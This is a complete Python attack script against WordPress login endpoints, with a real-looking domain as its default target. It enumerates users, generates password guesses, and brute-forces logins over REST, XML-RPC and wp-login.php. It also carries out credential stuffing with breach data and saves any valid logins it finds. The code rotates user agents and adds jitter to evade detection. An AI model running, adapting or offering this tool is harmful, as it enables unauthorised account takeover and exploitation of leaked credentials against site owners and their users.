#!/usr/bin/env python3
"""
Advanced WordPress Credential Testing & Brute Force
Intelligent password attack with rate limiting and detection evasion
"""

import requests
import time
import hashlib
import random
import string
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
import json
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

import os
try:
    with open('config.json', 'r') as f:
        config = json.load(f)
        TARGET = config.get('target', {}).get('url', "https://lead.se")
        TIMEOUT = config.get('target', {}).get('timeout', 10)
        OUTPUT_DIR = config.get('reporting', {}).get('output_directory', '.')
except Exception as e:
    print(f"Warning: Could not load config.json: {e}")
    TARGET = "https://lead.se"
    TIMEOUT = 10
    OUTPUT_DIR = "."

@dataclass
class Credential:
    username: str
    password: str
    source: str  # Where the credential came from

class AdvancedCredentialTester:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.valid_credentials = []
        self.enumerated_users = []
        self.failed_attempts = 0
        self.successful_logins = 0
        
        # Rotate user agents to avoid detection
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
        ]
    
    def print_header(self, text: str):
        print(f"\n{'='*70}")
        print(f"  {text}")
        print(f"{'='*70}\n")
    
    def rotate_user_agent(self):
        """Rotate user agent to avoid fingerprinting"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents)
        })
    
    def add_jitter(self, base_delay: float = 1.0):
        """Add random delay to avoid pattern detection"""
        jitter = random.uniform(0.5, 1.5)
        time.sleep(base_delay * jitter)
    
    # ==================== USER ENUMERATION ====================
    
    def enumerate_users_author_archives(self) -> List[str]:
        """Enumerate users via author archives"""
        print("[*] Enumerating users via author archives...")
        users = []
        
        for user_id in range(1, 20):
            url = f"{self.target}/?author={user_id}"
            try:
                resp = self.session.get(url, timeout=TIMEOUT, allow_redirects=False, verify=False)
                
                if resp.status_code in [301, 302]:
                    location = resp.headers.get('Location', '')
                    if '/author/' in location:
                        username = location.split('/author/')[-1].strip('/')
                        if username and username not in users:
                            users.append(username)
                            print(f"  ✅ Found user: {username} (ID: {user_id})")
                
                self.add_jitter(0.5)
            except:
                continue
        
        return users
    
    def enumerate_users_rest_api(self) -> List[str]:
        """Enumerate users via REST API"""
        print("[*] Enumerating users via REST API...")
        users = []
        
        url = f"{self.target}/wp-json/wp/v2/users"
        try:
            resp = self.session.get(url, timeout=TIMEOUT, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                for user in data:
                    username = user.get('slug')
                    if username and username not in users:
                        users.append(username)
                        print(f"  ✅ Found user: {username} (ID: {user.get('id')})")
        except:
            pass
        
        return users
    
    def enumerate_users_login_error(self, test_username: str = "admin") -> bool:
        """Check if login errors reveal user existence"""
        print("[*] Testing login error messages for user enumeration...")
        
        url = f"{self.target}/wp-login.php"
        
        # Test with non-existent user
        data1 = {
            'log': 'nonexistentuser_' + ''.join(random.choices(string.ascii_lowercase, k=10)),
            'pwd': 'wrongpassword',
            'wp-submit': 'Log In'
        }
        
        # Test with likely existing user
        data2 = {
            'log': test_username,
            'pwd': 'wrongpassword',
            'wp-submit': 'Log In'
        }
        
        try:
            resp1 = self.session.post(url, data=data1, verify=False)
            self.add_jitter()
            resp2 = self.session.post(url, data=data2, verify=False)
            
            # Compare error messages
            if resp1.text != resp2.text:
                print("  🔴 VULNERABLE: Login errors reveal user existence")
                return True
            else:
                print("  ✅ Login errors are generic")
                return False
        except:
            return False
    
    def enumerate_all_users(self) -> List[str]:
        """Comprehensive user enumeration"""
        self.print_header("User Enumeration Phase")
        
        all_users = []
        
        # Method 1: Author archives
        users1 = self.enumerate_users_author_archives()
        all_users.extend(users1)
        
        # Method 2: REST API
        users2 = self.enumerate_users_rest_api()
        for user in users2:
            if user not in all_users:
                all_users.append(user)
        
        # Method 3: Login error analysis
        self.enumerate_users_login_error()
        
        # Add common default usernames if none found
        if not all_users:
            all_users = ['admin', 'administrator', 'user', 'test']
            print("  ⚠️  No users enumerated, using default list")
        
        self.enumerated_users = all_users
        print(f"\n📊 Total users enumerated: {len(all_users)}")
        return all_users
    
    # ==================== PASSWORD GENERATION ====================
    
    def generate_smart_passwords(self, username: str, site_name: str = "") -> List[str]:
        """Generate intelligent password list based on username and site"""
        passwords = []
        
        # Extract site name from URL
        if not site_name:
            site_name = self.target.split('//')[1].split('/')[0].split('.')[0]
        
        # Common patterns
        years = ['2024', '2023', '2022', '2021', '2020']
        common_suffixes = ['!', '@', '#', '123', '1234', '12345', '!@#']
        
        # Username-based passwords
        passwords.extend([
            username,
            username.capitalize(),
            username.upper(),
            username.lower(),
        ])
        
        # Username + numbers
        for year in years:
            passwords.extend([
                f"{username}{year}",
                f"{username.capitalize()}{year}",
                f"{year}{username}",
            ])
        
        for suffix in common_suffixes:
            passwords.extend([
                f"{username}{suffix}",
                f"{username.capitalize()}{suffix}",
            ])
        
        # Site-based passwords
        passwords.extend([
            site_name,
            site_name.capitalize(),
            f"{site_name}123",
            f"{site_name}@123",
        ])
        
        # Common weak passwords
        common_weak = [
            'password', 'Password', 'Password123', 'P@ssw0rd', 'P@ssword',
            'admin', 'Admin', 'Admin123', 'admin123',
            'welcome', 'Welcome', 'Welcome123', 'Welcome@123',
            'letmein', 'Letmein', 'letmein123',
            '123456', '1234567', '12345678', '123456789',
            'qwerty', 'Qwerty', 'qwerty123',
            'password1', 'Password1', 'Password1!',
        ]
        passwords.extend(common_weak)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_passwords = []
        for pwd in passwords:
            if pwd not in seen:
                seen.add(pwd)
                unique_passwords.append(pwd)
        
        return unique_passwords
    
    def load_password_list(self, filename: str) -> List[str]:
        """Load passwords from file"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []
    
    # ==================== AUTHENTICATION TESTING ====================
    
    def test_xmlrpc_auth(self, username: str, password: str) -> Tuple[bool, str]:
        """Test authentication via XML-RPC"""
        url = f"{self.target}/xmlrpc.php"
        
        payload = f"""<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>{username}</string></value></param>
<param><value><string>{password}</string></value></param>
</params>
</methodCall>"""
        
        try:
            resp = self.session.post(url, data=payload, 
                                   headers={'Content-Type': 'text/xml'},
                                   timeout=TIMEOUT, verify=False)
            
            if 'isAdmin' in resp.text or 'blogName' in resp.text:
                return True, "Valid credentials"
            elif 'Incorrect username or password' in resp.text:
                return False, "Invalid credentials"
            elif '403' in resp.text or 'forbidden' in resp.text.lower():
                return False, "XML-RPC blocked"
            else:
                return False, "Unknown response"
        except:
            return False, "Connection error"
    
    def test_rest_api_auth(self, username: str, password: str) -> Tuple[bool, Dict]:
        """Test authentication via REST API"""
        url = f"{self.target}/wp-json/wp/v2/users/me"
        
        try:
            resp = self.session.get(url, auth=(username, password), 
                                  timeout=TIMEOUT, verify=False)
            
            if resp.status_code == 200:
                data = resp.json()
                return True, data
            else:
                return False, {}
        except:
            return False, {}
    
    def test_wp_login_auth(self, username: str, password: str) -> Tuple[bool, str]:
        """Test authentication via wp-login.php"""
        url = f"{self.target}/wp-login.php"
        
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f"{self.target}/wp-admin/",
            'testcookie': '1'
        }
        
        try:
            resp = self.session.post(url, data=data, allow_redirects=False, 
                                   timeout=TIMEOUT, verify=False)
            
            # Check for successful login indicators
            if resp.status_code == 302:
                location = resp.headers.get('Location', '')
                if 'wp-admin' in location and 'wp-login' not in location:
                    return True, "Login successful (redirect to admin)"
            
            # Check response content
            if 'dashboard' in resp.text.lower() or 'logout' in resp.text.lower():
                return True, "Login successful"
            
            return False, "Invalid credentials"
        except:
            return False, "Connection error"
    
    def test_credentials(self, username: str, password: str) -> bool:
        """Test credentials using multiple methods"""
        self.rotate_user_agent()
        
        # Try REST API first (faster)
        success, data = self.test_rest_api_auth(username, password)
        if success:
            print(f"\n🔴 SUCCESS via REST API!")
            print(f"   Username: {username}")
            print(f"   Password: {password}")
            print(f"   User Data: {json.dumps(data, indent=2)}")
            return True
        
        # Try XML-RPC
        success, message = self.test_xmlrpc_auth(username, password)
        if success:
            print(f"\n🔴 SUCCESS via XML-RPC!")
            print(f"   Username: {username}")
            print(f"   Password: {password}")
            return True
        
        # Try wp-login.php
        success, message = self.test_wp_login_auth(username, password)
        if success:
            print(f"\n🔴 SUCCESS via wp-login.php!")
            print(f"   Username: {username}")
            print(f"   Password: {password}")
            return True
        
        return False
    
    # ==================== BRUTE FORCE ATTACK ====================
    
    def brute_force_attack(self, usernames: List[str], passwords: List[str], 
                          max_attempts: int = 100, delay: float = 2.0):
        """Execute intelligent brute force attack"""
        self.print_header("Credential Testing Phase")
        
        print(f"Usernames to test: {len(usernames)}")
        print(f"Passwords per user: {min(len(passwords), max_attempts)}")
        print(f"Delay between attempts: {delay}s (with jitter)")
        print(f"Total max attempts: {len(usernames) * min(len(passwords), max_attempts)}\n")
        
        for username in usernames:
            print(f"\n{'─'*70}")
            print(f"Testing user: {username}")
            print(f"{'─'*70}")
            
            attempts = 0
            
            for password in passwords[:max_attempts]:
                attempts += 1
                print(f"[{attempts}/{min(len(passwords), max_attempts)}] Testing: {password[:20]}...", end=" ")
                
                if self.test_credentials(username, password):
                    self.valid_credentials.append(Credential(username, password, "brute_force"))
                    self.successful_logins += 1
                    
                    # Save immediately
                    self.save_credentials()
                    
                    print("\n⚠️  STOPPING - Valid credentials found!")
                    return  # Stop after first success
                else:
                    print("❌")
                    self.failed_attempts += 1
                
                # Rate limiting with jitter
                self.add_jitter(delay)
                
                # Check if we should stop (too many failures might trigger lockout)
                if self.failed_attempts > 0 and self.failed_attempts % 10 == 0:
                    print(f"\n⚠️  {self.failed_attempts} failed attempts - increasing delay...")
                    delay *= 1.2  # Exponential backoff
    
    # ==================== CREDENTIAL STUFFING ====================
    
    def credential_stuffing_attack(self, credential_file: str):
        """Test leaked credentials from breaches"""
        self.print_header("Credential Stuffing Attack")
        
        print(f"[*] Loading credentials from: {credential_file}")
        
        try:
            with open(credential_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        username, password = line.split(':', 1)
                        
                        print(f"Testing: {username}:{password[:20]}...", end=" ")
                        
                        if self.test_credentials(username, password):
                            self.valid_credentials.append(Credential(username, password, "credential_stuffing"))
                            self.successful_logins += 1
                            self.save_credentials()
                            print("\n⚠️  STOPPING - Valid credentials found!")
                            return
                        else:
                            print("❌")
                            self.failed_attempts += 1
                        
                        self.add_jitter(1.5)
        except FileNotFoundError:
            print(f"❌ File not found: {credential_file}")
    
    # ==================== REPORTING ====================
    
    def save_credentials(self):
        """Save valid credentials to file"""
        if self.valid_credentials:
            if not os.path.exists(OUTPUT_DIR):
                try:
                    os.makedirs(OUTPUT_DIR)
                except:
                    pass
            filename = os.path.join(OUTPUT_DIR, f"valid_credentials_{int(time.time())}.json")
            data = {
                'target': self.target,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'credentials': [
                    {
                        'username': cred.username,
                        'password': cred.password,
                        'source': cred.source
                    }
                    for cred in self.valid_credentials
                ]
            }
            
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"\n💾 Credentials saved to: {filename}")
    
    def generate_report(self):
        """Generate attack summary report"""
        self.print_header("Attack Summary")
        
        print(f"Target: {self.target}")
        print(f"Users enumerated: {len(self.enumerated_users)}")
        print(f"Total attempts: {self.failed_attempts + self.successful_logins}")
        print(f"Failed attempts: {self.failed_attempts}")
        print(f"Successful logins: {self.successful_logins}")
        
        if self.valid_credentials:
            print(f"\n🔴 VALID CREDENTIALS FOUND:")
            for cred in self.valid_credentials:
                print(f"  Username: {cred.username}")
                print(f"  Password: {cred.password}")
                print(f"  Source: {cred.source}")
                print()
        else:
            print(f"\n✅ No valid credentials found")
        
        print("\n" + "="*70)
    
    # ==================== MAIN EXECUTION ====================
    
    def run_attack(self, mode: str = "smart", password_file: str = None, 
                   max_attempts: int = 50):
        """
        Run credential attack
        
        Modes:
        - smart: Enumerate users + intelligent password generation
        - wordlist: Use custom password wordlist
        - stuffing: Use username:password pairs from breach data
        """
        print(f"""
╔══════════════════════════════════════════════════════════════════╗
║     Advanced WordPress Credential Testing                       ║
║     Target: {self.target:50s} ║
║     Mode: {mode:58s} ║
╚══════════════════════════════════════════════════════════════════╝
        """)
        
        if mode == "stuffing" and password_file:
            self.credential_stuffing_attack(password_file)
        else:
            # Enumerate users
            users = self.enumerate_all_users()
            
            if not users:
                print("❌ No users found - cannot proceed")
                return
            
            # Generate or load passwords
            if mode == "wordlist" and password_file:
                passwords = self.load_password_list(password_file)
                if not passwords:
                    print(f"❌ Could not load passwords from {password_file}")
                    return
            else:
                # Smart password generation
                passwords = []
                for user in users:
                    user_passwords = self.generate_smart_passwords(user)
                    passwords.extend(user_passwords)
                
                # Remove duplicates
                passwords = list(dict.fromkeys(passwords))
            
            print(f"\n📊 Generated {len(passwords)} unique passwords")
            
            # Execute brute force
            self.brute_force_attack(users, passwords, max_attempts=max_attempts)
        
        # Generate report
        self.generate_report()
        self.save_credentials()

def main():
    tester = AdvancedCredentialTester(TARGET)
    
    # Run smart attack with limited attempts (safe for testing)
    tester.run_attack(mode="smart", max_attempts=20)

if __name__ == "__main__":
    main()
